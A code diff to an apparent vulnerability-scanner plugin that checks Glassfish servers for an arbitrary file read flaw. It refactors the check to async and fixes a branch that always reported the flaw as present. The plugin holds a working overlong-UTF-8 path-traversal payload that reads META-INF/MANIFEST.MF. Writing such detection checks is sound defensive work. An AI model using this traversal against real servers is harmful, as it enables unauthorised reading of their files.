@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class Glassfish_File_Read_BaseVerify:
     def __init__(self, url):
@@ -17,7 +17,7 @@ class Glassfish_File_Read_BaseVerify:
                 "User-Agent": get_useragent()
         }
 
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -29,15 +29,12 @@ class Glassfish_File_Read_BaseVerify:
 
         url = self.url + '/theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF'
         try:
-            req = request.get(url, headers = self.headers)
-            if 'Version' in req.text:
-                result = "exits the Glassfish arbitrary file read vuln"
+            req = await request.get(url, headers = self.headers, allow_redirects = False)
+            if 'Version' in await req.text():
                 return True
-            else:
-                return True
+            
         except Exception as e:
-            return False
-        finally:
+            # print(e)
             pass
 
 if __name__ == '__main__':
